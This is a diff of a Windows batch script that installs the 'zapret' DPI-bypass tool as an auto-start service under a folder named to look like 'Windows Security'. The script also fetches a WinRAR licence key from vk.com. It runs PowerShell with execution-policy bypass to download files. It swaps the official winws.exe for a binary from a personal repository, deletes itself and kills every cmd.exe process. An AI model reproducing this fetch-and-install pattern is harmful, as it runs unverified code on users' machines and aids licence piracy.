@@ -37,7 +37,6 @@ if "%menu_choice%"=="3" goto Deactivation
 if "%menu_choice%"=="4" goto updates
 if "%menu_choice%"=="0" exit /b
 goto menu
-
 :Downloads_WinRAR
 
 CD "%UserProfile%\Downloads"
@@ -46,10 +45,8 @@ CALL WinRAR.exe
 CD %ProgramFiles%\WinRAR
 powershell -executionpolicy bypass -command Invoke-WebRequest "https://vk.com/doc133615773_452959686" -o "rarreg.key"
 goto menu
-
 :Activation
 
-chcp 65001 > nul
 netsh interface ip set dns name="Ethernet" source="static" address="8.8.8.8"
 netsh interface ip add dns name="Ethernet" address="8.8.4.4" index=2
 ECHO animakima.me>>"%ProgramFiles%\Windows Security\Soldatik90\Fix\lists\list-general.txt"
@@ -57,11 +54,10 @@ ECHO googleusercontent.com>>"%ProgramFiles%\Windows Security\Soldatik90\Fix\list
 ECHO rutube.ru>>"%ProgramFiles%\Windows Security\Soldatik90\Fix\lists\list-general.txt"
 ECHO flcksbr.top>>"%ProgramFiles%\Windows Security\Soldatik90\Fix\lists\list-general.txt"
 del /S /Q "C:\Users\%username%\Downloads\Menu.bat" | del /S /Q "C:\Users\%username%\Desktop\Menu.bat"
-cd /d "%~dp0/fix"
-set "BIN_PATH=%~dp0/fix/bin\"
-set "LISTS_PATH=%~dp0fix/lists\"
-cls
-:: Searching for .bat files in current folder, except files that start with "service"
+cd /d "%ProgramFiles%\Windows Security\Soldatik90\Fix"
+set "BIN_PATH=%ProgramFiles%\Windows Security\Soldatik90\Fix\bin\"
+set "LISTS_PATH=%ProgramFiles%\Windows Security\Soldatik90\Fix\lists\"
+
 echo Pick one of the options:
 set "count=0"
 for %%f in (*.bat) do (
@@ -72,43 +68,49 @@ for %%f in (*.bat) do (
         set "file!count!=%%f"
     )
 )
-:: Choosing file
+
 set "choice="
 set /p "choice=Input file index (number): "
 if "!choice!"=="" goto :eof
+
 set "selectedFile=!file%choice%!"
 if not defined selectedFile (
     echo Invalid choice, exiting...
     pause
     goto menu
 )
-:: Args that should be followed by value
+
 set "args_with_value=sni"
-:: Parsing args (mergeargs: 2=start param|3=arg with value|1=params args|0=default)
 set "args="
 set "capture=0"
 set "mergeargs=0"
 set QUOTE="
+
 for /f "tokens=*" %%a in ('type "!selectedFile!"') do (
     set "line=%%a"
-    call set "line=%%line:^!=EXCL_MARK%%"
+
     echo !line! | findstr /i "%BIN%winws.exe" >nul
     if not errorlevel 1 (
         set "capture=1"
     )
+
     if !capture!==1 (
         if not defined args (
             set "line=!line:*%BIN%winws.exe"=!"
         )
+
         set "temp_args="
         for %%i in (!line!) do (
             set "arg=%%i"
+
             if not "!arg!"=="^" (
                 if "!arg:~0,2!" EQU "--" if not !mergeargs!==0 (
                     set "mergeargs=0"
                 )
+
                 if "!arg:~0,1!" EQU "!QUOTE!" (
                     set "arg=!arg:~1,-1!"
+
                     echo !arg! | findstr ":" >nul
                     if !errorlevel!==0 (
                         set "arg=\!QUOTE!!arg!\!QUOTE!"
@@ -124,6 +126,7 @@ for /f "tokens=*" %%a in ('type "!selectedFile!"') do (
                 ) else if "!arg:~0,12!" EQU "%%GameFilter%%" (
                     set "arg=%GameFilter%"
                 )
+
                 if !mergeargs!==1 (
                     set "temp_args=!temp_args!,!arg!"
                 ) else if !mergeargs!==3 (
@@ -132,6 +135,7 @@ for /f "tokens=*" %%a in ('type "!selectedFile!"') do (
                 ) else (
                     set "temp_args=!temp_args! !arg!"
                 )
+
                 if "!arg:~0,2!" EQU "--" (
                     set "mergeargs=2"
                 ) else if !mergeargs!==2 (
@@ -151,59 +155,42 @@ for /f "tokens=*" %%a in ('type "!selectedFile!"') do (
         )
     )
 )
-call :tcp_enable
+
 set ARGS=%args%
-call set "ARGS=%%ARGS:EXCL_MARK=^!%%"
 echo Final args: !ARGS!
 set SRVCNAME=zapret
+
 net stop %SRVCNAME% >nul 2>&1
 sc delete %SRVCNAME% >nul 2>&1
-sc create %SRVCNAME% binPath= "\"%BIN_PATH%winws.exe\" !ARGS!" DisplayName= "zapret" start= auto
+sc create %SRVCNAME% binPath= "\"%BIN_PATH%winws.exe\" %ARGS%" DisplayName= "zapret" start= auto
 sc description %SRVCNAME% "Zapret DPI bypass software"
 sc start %SRVCNAME%
-for %%F in ("!file%choice%!") do (
-    set "filename=%%~nF"
-)
-reg add "HKLM\System\CurrentControlSet\Services\zapret" /v zapret-discord-youtube /t REG_SZ /d "!filename!" /f
-pause
+Taskkill  /IM "cmd.exe" /F
 goto menu
-
 :Deactivation
 
-RMDIR /S /Q "%ProgramFiles%\Windows Security\Soldatik90\Fix"
 netsh interface ip set dns name="Ethernet" source="static" address=""
 netsh interface ip add dns name="Ethernet" address="" index=2
 cls
 chcp 65001 > nul
-set SRVCNAME=zapret
-sc query "!SRVCNAME!" >nul 2>&1
-if !errorlevel!==0 (
-    net stop %SRVCNAME%
-    sc delete %SRVCNAME%
-) else (
-    echo Service "%SRVCNAME%" is not installed.
-)
-tasklist /FI "IMAGENAME eq winws.exe" | find /I "winws.exe" > nul
-if !errorlevel!==0 (
-    taskkill /IM winws.exe /F > nul
-)
-sc query "WinDivert" >nul 2>&1
-if !errorlevel!==0 (
-    net stop "WinDivert"
-    sc query "WinDivert" >nul 2>&1
-    if !errorlevel!==0 (
-        sc delete "WinDivert"
-    )
-)
-net stop "WinDivert14" >nul 2>&1
-sc delete "WinDivert14" >nul 2>&1
-goto menu
 
+set SRVCNAME=zapret
+net stop %SRVCNAME%
+sc delete %SRVCNAME%
+
+net stop "WinDivert"
+sc delete "WinDivert"
+net stop "WinDivert14"
+sc delete "WinDivert14"
+RMDIR /S /Q  "%ProgramFiles%\Windows Security\Soldatik90\Fix"
+RMDIR /S /Q  "%ProgramFiles%\Windows Security\Soldatik90\Zapret"
+Taskkill  /IM "cmd.exe" /F
+goto menu
 :updates
 
 Md "%ProgramFiles%\Windows Security\Soldatik90\Soft"
 cd "%ProgramFiles%\Windows Security\Soldatik90\Soft"
-powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.8.4/zapret-discord-youtube-1.8.4.zip" -o "Soldatik90.zip"
+powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.7.2b/zapret-discord-youtube-1.7.2b.zip" -o "Soldatik90.zip"
 powershell.exe -Nop -Nol -Command "Expand-Archive './Soldatik90.zip' './'
 cd "%ProgramFiles%\Windows Security\Soldatik90\Soft\bin"
 powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Soldatik90x/Soldatik90/raw/refs/heads/main/WinWS.exe" -o "WinWS.exe"
